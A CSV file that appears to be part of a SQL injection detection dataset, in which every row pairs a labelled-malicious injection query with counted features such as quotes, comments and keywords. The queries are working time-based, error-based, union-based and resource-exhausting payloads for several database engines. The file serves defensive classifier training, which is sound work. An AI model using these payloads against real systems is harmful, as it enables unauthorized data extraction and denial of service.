,Query,Label,query_len,num_words_query,no_single_qts,no_double_qts,no_punct,no_single_cmnt,no_mult_cmnt,no_space,no_perc,no_log_opt,no_arith,no_null,no_hexa,no_alpha,no_digit,len_of_chr_char_null,genuine_keywords
3375,"1""  )   as vpna where 5450  =  5450 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,265,55,0,1,44,1,0,54,0,6,2,2,0,82,33,9,0
3376,1' rlike sleep  (  5  )   and 'gtfo'  =  'gtfo,1,46,10,4,0,7,0,0,9,0,1,0,0,0,21,2,0,0
3377,-8966%' or   (  7475  =  4014  )  *4014 and '%'  =  ',1,53,12,4,0,12,0,0,11,2,2,2,0,0,5,16,0,0
3378,1  )   as sdnd where 9472  =  9472,1,34,8,0,0,2,0,0,7,0,0,0,0,0,11,9,0,0
3379,1   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  5368  =  5368,1,388,79,0,0,63,0,0,78,0,12,0,0,0,94,53,10,1
3380,"1%"" rlike sleep  (  5  )   and ""%""  =  """,1,40,10,0,4,9,0,0,9,2,1,0,0,0,13,2,0,0
3381,"-9944""   )    )    or 8537  =  2039 and    (    (   ""kfzj""  =  ""kfzj",1,68,13,0,4,11,0,0,12,0,2,1,0,0,13,12,0,0
3382,"1%""  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,128,26,0,1,26,1,0,25,1,4,2,0,0,37,15,4,0
3383,"-3347'+  (  select xuzs where 1076  =  1076 union all select 1076,1076,1076,1076,1076--",1,87,12,1,0,11,1,0,11,0,0,4,0,0,29,32,0,2
3384,"1'   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'lyem' like 'lyem",1,227,41,4,0,31,0,0,40,0,2,1,0,1,59,32,0,3
3385,"-7764"" or 7308  =  7805",1,23,5,0,1,3,0,0,4,0,1,1,0,0,2,12,0,0
3386,"1%'   )    )    union all select null,null,null,null,null,null,null,null,null,null--",1,84,7,1,0,15,1,0,6,1,0,2,10,0,54,1,10,1
3387,1' in boolean mode  )   and sleep  (  5  )  #,1,45,11,1,0,5,0,0,10,0,1,0,0,0,21,2,0,0
3388,"-4152""  )   where 9781  =  9781 union all select 9781,9781,9781,9781,9781--",1,75,10,0,1,10,1,0,9,0,0,3,0,0,19,32,0,1
3389,"1"" and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1,242,39,0,1,28,0,0,39,0,1,2,0,1,49,71,0,4
3390,"1%""  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,126,20,0,1,20,1,0,19,1,1,3,0,0,62,10,0,2
3391,"-6122""  )   union all select 6578,6578--",1,40,6,0,1,6,1,0,5,0,0,3,0,0,14,12,0,1
3392,select   (  case when   (  5768  =  9169  )   then 5768 else 1/  (  select 0  )   end  )  --,1,92,20,0,0,10,1,0,19,0,0,3,0,0,31,14,0,2
3393,"1' where 9003  =  9003 and make_set  (  5868  =  8316,8316  )  --",1,65,13,1,0,9,1,0,12,0,1,2,0,0,15,21,0,0
3394,"1""   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""dzse""  =  ""dzse",1,194,31,0,4,27,0,0,30,0,2,0,0,1,47,35,0,1
3395, (  select   (  case when   (  8130  =  5894  )   then 8130 else 8130*  (  select 8130 from information_schema.character_sets  )   end   )    ) ,1,144,23,0,0,13,0,0,24,0,0,1,0,0,65,20,1,2
3396,select case when 4537  =  8418 then 1 else null end--,1,53,11,0,0,3,1,0,10,0,0,2,1,0,29,9,1,1
3397,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,1,69,15,0,0,8,1,0,14,0,1,2,0,0,23,10,0,1
3398,"1 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  -- jpqa",1,259,46,0,0,31,1,0,45,0,1,4,0,0,101,35,1,4
3399,"1""  )   where 5298  =  5298 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",1,350,73,0,1,59,1,0,72,0,11,2,0,0,94,53,10,1
3400,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",1,65,5,0,1,11,0,0,4,1,0,1,0,0,14,36,0,1
3401,"1'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'lqql'  =  'lqql",1,133,23,6,0,20,0,0,22,0,2,1,0,0,42,15,0,0
3402,"iif  (  3447  =  1084,1,1/0  )  ",1,32,6,0,0,6,0,0,6,0,0,1,0,0,3,11,0,0
3403,"1'   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  'vfnl'  =  'vfnl",1,195,32,4,0,28,0,0,31,0,2,0,0,1,45,39,0,1
3404,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'pgyl'  =  'pgyl",1,122,22,4,0,17,0,0,21,0,2,1,0,0,43,13,0,2
3405,1'||  (  select 'uedk' where 4655  =  4655,1,42,8,3,0,7,0,0,7,0,1,0,0,0,15,9,0,1
3406,"1%"" or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,175,28,0,1,16,1,0,27,1,1,3,0,0,108,12,0,2
3407,"1' or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,179,36,1,0,30,1,0,35,0,4,2,1,0,52,27,6,0
3408,select   (  case when   (  1291  =  6612  )   then 1 else 1291*  (  select 1291 from master..sysdatabases  )   end  )  --,1,121,22,0,0,12,1,0,21,0,0,3,0,0,53,17,0,2
3409,-2429%' or 6890  =  5846,1,24,5,1,0,4,0,0,4,1,1,1,0,0,2,12,0,0
3410,"1%""   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  ""%""  =  """,1,116,21,0,4,19,0,0,20,2,2,0,0,1,18,21,0,0
3411,-4761 order by 1--,1,18,4,0,0,3,1,0,3,0,0,3,0,0,7,5,0,1
3412,1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,79,18,1,0,11,0,0,17,0,1,1,0,0,27,2,0,2
3413,"-4394'   )    )    union all select 3409,3409--",1,47,7,1,0,7,1,0,6,0,0,3,0,0,14,12,0,1
3414,-2960' or 2163  =  3143--,1,25,5,1,0,5,1,0,4,0,1,3,0,0,2,12,0,0
3415,1'  )   where 1645  =  1645 rlike sleep  (  5  )  --,1,52,12,1,0,7,1,0,11,0,0,2,0,0,15,10,0,0
3416,"-6890""   )    )     )   union all select 1115#",1,46,8,0,1,6,0,0,7,0,0,1,0,0,14,8,0,1
3417,1  )   where 4479  =  4479 rlike   (  select   (  case when   (  6351  =  4367  )   then 1 else 0x28 end   )    )   --,1,118,25,0,0,11,1,0,24,0,0,2,0,1,36,21,0,1
3418,"select * from generate_series  (  2317,2317,case when   (  2317  =  9706  )   then 1 else 0 end  )   limit 1--",1,110,20,0,0,11,1,0,19,0,0,3,0,0,48,19,0,1
3419,"select * from generate_series  (  3427,3427,case when   (  3427  =  7516  )   then 1 else 0 end  )   limit 1--",1,110,20,0,0,11,1,0,19,0,0,3,0,0,48,19,0,1
3420,"1"" and elt  (  4249  =  4249,7259  )  ",1,38,8,0,1,5,0,0,8,0,1,0,0,0,6,13,0,0
3421,"1'   )    )    as ewyk where 4828  =  4828 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,284,48,1,0,33,1,0,47,0,1,4,0,1,60,79,0,4
3422,"select count  (  *  )   from generate_series  (  1,5000000  )   and ""%""  =  """,1,77,14,0,3,12,0,0,13,1,1,1,0,0,32,8,0,2
3423,"-8186%' or elt  (  1032  =  1032,3623  )   and '%'  =  '",1,56,12,4,0,12,0,0,11,2,2,1,0,0,8,16,0,0
3424,1   )    )    rlike sleep  (  5  )   and    (    (   8773  =  8773,1,66,14,0,0,7,0,0,13,0,1,0,0,0,13,10,0,0
3425,select case when 7649  =  9297 then 1 else null end--,1,53,11,0,0,3,1,0,10,0,0,2,1,0,29,9,1,1
3426,"-2872  )   where 8797  =  8797 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,225,45,0,0,23,0,0,44,0,1,2,0,0,68,45,0,1
3427,"-7255' union all select 2127,2127,2127,2127,2127#",1,49,5,1,0,7,0,0,4,0,0,1,0,0,14,24,0,1
3428,"1'  )   where 1363  =  1363 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",1,201,41,1,0,32,1,0,40,0,4,2,1,0,57,32,6,0
3429,"1%""   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   ""%""  =  """,1,178,30,0,4,28,0,0,29,2,2,0,0,1,36,39,0,1
3430,"1'||  (  select 'jpow' from dual where 4381  =  4381 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",1,313,55,4,0,40,0,0,54,0,3,2,0,0,120,43,1,5
3431,1  )   as tbve where 4828  =  4828,1,34,8,0,0,2,0,0,7,0,0,0,0,0,11,9,0,0
3432,1'+  (  select iwbs where 4939  =  4939,1,39,8,1,0,4,0,0,7,0,0,1,0,0,15,9,0,1
3433,"1' in boolean mode  )   union all select null,null,null,null,null--",1,67,9,1,0,8,1,0,8,0,0,2,5,0,47,1,5,1
3434,"-4385%'   )    )    union all select 6694,6694,6694,6694,6694,6694,6694,6694,6694,6694#",1,87,7,1,0,15,0,0,6,1,0,1,0,0,14,44,0,1
3435,select   (  case when   (  7271  =  1658  )   then 7271 else 7271*  (  select 7271 from information_schema.character_sets  )   end  )  #,1,136,22,0,0,12,0,0,21,0,0,1,0,0,65,20,1,2
3436,1'  )   as fksm where 9714  =  9714,1,35,8,1,0,3,0,0,7,0,0,0,0,0,11,9,0,0
3437,"1 where 1153  =  1153 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1,160,26,0,0,19,1,0,25,0,1,2,0,1,41,43,0,1
3438,1  )   as drgs where 1989  =  1989 order by 1--,1,47,11,0,0,4,1,0,10,0,0,2,0,0,18,10,0,1
3439,"1' and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,69,12,1,0,8,0,0,11,0,1,0,0,1,16,21,0,0
3440,"1'   )    )    as kwre where 7775  =  7775 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,170,30,1,0,19,1,0,29,0,1,3,0,0,83,17,0,2
3441,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  'qhgp'  =  'qhgp",1,140,22,3,0,17,0,0,21,0,1,1,0,0,80,4,0,2
3442,"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'blnh' like 'blnh",1,171,27,4,0,22,0,0,26,0,2,0,0,1,51,35,0,1
3443,-1499  )   as gxfm where 9762  =  9762 or 5989  =  4782--,1,57,12,0,0,6,1,0,11,0,1,3,0,0,13,20,0,0
3444,"1""   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,133,21,0,1,20,1,0,20,0,1,3,0,0,63,10,0,2
3445,1'+  (  select 'toec' where 5810  =  5810 and sleep  (  5   )    )   +',1,71,15,4,0,11,0,0,14,0,1,2,0,0,23,10,0,1
3446,"1 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1,171,27,0,0,12,0,0,27,0,1,1,0,0,108,12,0,2
3447,-4023 or   (  8779  =  5716  )  *5716,1,37,8,0,0,5,0,0,7,0,1,2,0,0,2,16,0,0
3448,1'||  (  select 'eyiy' from dual where 8127  =  8127,1,52,10,3,0,7,0,0,9,0,1,0,0,0,23,9,0,1
3449,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  'vfxg' like 'vfxg",1,129,20,3,0,14,0,0,19,0,1,1,0,0,84,4,0,2
3450,"1',  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",1,72,14,1,0,10,0,0,14,0,0,0,0,0,24,10,0,0
3451,"1""   )    )    as daqd where 4390  =  4390 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,93,20,0,1,11,0,0,19,0,1,0,0,0,22,18,0,0
3452,"-2009%' union all select 1991,1991#",1,35,5,1,0,5,0,0,4,1,0,1,0,0,14,12,0,1
3453,"1'   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   'fele'  =  'fele",1,96,19,4,0,15,0,0,18,0,2,0,0,0,21,10,0,0
3454,"1%'  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  '%'  =  '",1,144,24,4,0,24,0,0,23,2,2,1,0,0,66,10,0,2
3455,1  )   where 2199  =  2199 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,1,104,23,0,0,13,1,0,22,0,1,3,0,0,32,10,0,2
3456,"1' where 4417  =  4417 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1,143,29,1,0,25,1,0,28,0,4,2,0,0,42,24,4,0
3457,"-1620   )    )    union all select 6257,6257,6257,6257,6257,6257,6257,6257,6257,6257--",1,86,7,0,0,14,1,0,6,0,0,3,0,0,14,44,0,1
3458,"1'+  (  select 'opqr' where 2442  =  2442 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,159,26,3,0,23,1,0,25,0,1,4,0,0,77,18,0,3
3459,"1"" and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   ",1,323,67,0,1,55,0,0,67,0,11,0,0,0,89,45,10,1
3460,"1  )   where 9206  =  9206 union all select null,null,null,null,null,null#",1,74,10,0,0,8,0,0,9,0,0,0,6,0,43,9,6,1
3461,"1'+  (  select 'ycsv' where 3628  =  3628 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,274,55,3,0,47,1,0,54,0,6,3,2,0,87,35,9,1
3462,"1%""  )   and 7533  =  7533 and   (  ""%""  =  """,1,45,11,0,4,10,0,0,10,2,2,0,0,0,6,9,0,0
3463,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   # lchh",1,100,16,2,0,13,0,0,15,0,0,1,0,0,39,10,0,1
3464,"1'||  (  select 'uusj' where 2149  =  2149 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",1,150,26,6,0,24,0,0,25,0,3,1,0,0,46,23,0,1
3465,"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   # fmxq",1,145,23,0,0,17,0,0,22,0,1,0,0,1,41,35,0,1
3466,"-1512 union all select 9013,9013,9013,9013#",1,43,5,0,0,5,0,0,4,0,0,1,0,0,14,20,0,1
3467,"1' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1,102,17,3,0,14,0,0,17,0,1,1,0,0,31,15,0,0
3468,"1'  )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,240,49,1,0,43,1,0,48,0,6,2,2,0,72,27,9,0
3469,1 waitfor delay '0:0:5'-- nnnp,1,30,5,2,0,6,1,0,4,0,0,2,0,0,16,4,0,0
3470,"1' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",1,122,19,1,0,12,0,0,19,0,1,1,0,0,71,8,0,2
3471,1'   )    )    as yqek where 1957  =  1957,1,42,9,1,0,4,0,0,8,0,0,0,0,0,11,9,0,0
3472,"1""   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""fjwv"" like ""fjwv",1,385,82,0,4,55,0,0,81,0,2,10,0,0,93,47,12,1
3473,1  )   as hggi where 6511  =  6511,1,34,8,0,0,2,0,0,7,0,0,0,0,0,11,9,0,0
3474,"1'   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'gxpr'  =  'gxpr",1,147,25,6,0,22,0,0,24,0,2,1,0,0,42,15,0,0
3475,"-6662""   )    )    union all select 6755--",1,42,7,0,1,6,1,0,6,0,0,3,0,0,14,8,0,1
3476,1'+  (  select 'hplm' where 4008  =  4008 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,105,21,3,0,14,1,0,20,0,1,3,0,0,35,18,0,2
3477,"1'   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,147,25,1,0,19,1,0,24,0,1,3,0,0,72,9,0,2
3478,"1""   )    )    and make_set  (  8266  =  9226,9226  )   and    (    (   ""omjx"" like ""omjx",1,89,16,0,4,13,0,0,15,0,2,0,0,0,25,13,0,0
3479,1'||  (  select 'oxdh' where 6967  =  6967 and sleep  (  5  )  #,1,64,14,3,0,10,0,0,13,0,2,0,0,0,23,10,0,1
3480,select   (  case when   (  5698  =  3453  )   then 5698 else 1/  (  select 0  )   end  )  --,1,92,20,0,0,10,1,0,19,0,0,3,0,0,31,14,0,2
3481,"-5776%' union all select 3075,3075,3075,3075,3075--",1,51,5,1,0,9,1,0,4,1,0,3,0,0,14,24,0,1
3482,"1'   )    )    as oldh where 9551  =  9551 union all select null,null,null#",1,75,13,1,0,7,0,0,12,0,0,0,3,0,37,9,3,1
3483,1 rlike sleep  (  5  )  #,1,25,7,0,0,3,0,0,6,0,0,0,0,0,10,2,0,0
3484,1  )   rlike   (  select   (  case when   (  5477  =  7492  )   then 1 else 0x28 end   )    )    and   (  4427  =  4427,1,119,25,0,0,10,0,0,24,0,1,0,0,1,34,21,0,1
3485,"1"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""sckh""  =  ""sckh",1,137,26,4,4,19,0,0,25,0,4,0,0,0,64,15,0,1
3486,"1""  )   where 1607  =  1607",1,27,6,0,1,3,0,0,5,0,0,0,0,0,5,9,0,0
3487,1%'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   '%'  =  ',1,117,25,4,0,20,0,0,24,2,2,1,0,0,30,2,0,2
3488,"-4194""   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ",1,255,50,0,1,39,0,0,50,0,6,1,0,0,75,33,5,1
3489,"1   )    )    as rual where 4649  =  4649 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,283,48,0,0,32,1,0,47,0,1,4,0,1,60,79,0,4
3490,"1%""   )    )    union all select null--",1,39,7,0,1,6,1,0,6,1,0,2,1,0,18,1,1,1
3491,1'+  (  select 'czpg' where 6627  =  6627 and 2006  =  2006,1,59,12,3,0,7,0,0,11,0,1,1,0,0,18,17,0,1
3492,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  ""%""  =  """,1,121,20,0,3,16,0,0,19,1,1,1,0,0,65,3,0,2
3493,1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  'zqiw'  =  'zqiw,1,112,23,4,0,16,0,0,22,0,1,1,0,0,41,2,0,2
3494,-1564'  )   order by 1--,1,24,5,1,0,5,1,0,4,0,0,3,0,0,7,5,0,1
3495,"1%' union all select null,null,null,null,null,null,null,null,null,null--",1,72,5,1,0,13,1,0,4,1,0,2,10,0,54,1,10,1
3496,"-7060'  )   or make_set  (  4233  =  1689,1689  )   and   (  'twpr' like 'twpr",1,78,14,4,0,12,0,0,13,0,2,1,0,0,24,16,0,0
3497,"1'   )    )    union all select null,null,null,null,null,null,null,null,null,null#",1,82,7,1,0,13,0,0,6,0,0,0,10,0,54,1,10,1
3498,"1"" where 8333  =  8333",1,22,5,0,1,2,0,0,4,0,0,0,0,0,5,9,0,0
3499,if  (  6745  =  4078  )   select 6745 else drop function ytyt--,1,63,12,0,0,5,1,0,11,0,0,2,0,0,28,12,0,1
3500,1%' and 1736  =  4220,1,21,5,1,0,3,0,0,4,1,1,0,0,0,3,9,0,0
3501,"-7528' or make_set  (  3809  =  1821,1821  )   and 'kgch'  =  'kgch",1,67,12,4,0,11,0,0,11,0,2,1,0,0,20,16,0,0
3502,"-8153' where 2436  =  2436 union all select 2436,2436,2436,2436,2436,2436,2436,2436,2436,2436#",1,94,9,1,0,13,0,0,8,0,0,1,0,0,19,52,0,1
3503,"1'||  (  select 'fcws' from dual where 9184  =  9184 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||'",1,200,33,4,0,28,0,0,32,0,3,0,0,1,57,47,0,2
3504,"1""  )   as tecq where 4817  =  4817 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,158,27,0,1,16,1,0,26,0,1,3,0,0,83,16,0,2
3505,"1"" or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,52,12,0,1,8,0,0,11,0,1,0,0,0,10,10,0,0
3506,"1  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  7984  =  7984",1,279,50,0,0,32,0,0,49,0,2,2,0,0,99,43,1,4
3507,1'||  (  select 'bsbv' from dual where 5276  =  5276 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu   )    )   ||',1,138,28,4,0,20,0,0,27,0,3,1,0,0,50,10,0,3
3508,"-9810'  )   where 4361  =  4361 or elt  (  1032  =  1032,3623  )  --",1,68,14,1,0,10,1,0,13,0,1,3,0,0,10,24,0,0
3509,"1%""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""%""  =  """,1,106,23,0,4,18,0,0,22,2,1,1,0,0,33,2,0,2
3510,"1""   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""xqlh""  =  ""xqlh",1,382,77,0,4,65,0,0,76,0,12,0,0,0,102,45,10,1
3511,1'   )    )    waitfor delay '0:0:5'--,1,38,6,3,0,9,1,0,5,0,0,2,0,0,12,4,0,0
3512,"-8093""   )    )    as oboi where 1476  =  1476 union all select 1476,1476,1476,1476#",1,84,13,0,1,9,0,0,12,0,0,1,0,0,25,28,0,1
3513,"1"" where 9341  =  9341",1,22,5,0,1,2,0,0,4,0,0,0,0,0,5,9,0,0
3514,"-3703""   )    )     )   union all select 3293,3293,3293,3293,3293,3293,3293,3293,3293,3293#",1,91,8,0,1,15,0,0,7,0,0,1,0,0,14,44,0,1
3515,"1   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  7813  =  7813",1,239,41,0,0,25,0,0,40,0,1,0,0,1,69,45,0,1
3516,1 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  -- izad,1,122,24,4,0,16,1,0,23,0,3,2,0,0,57,15,0,1
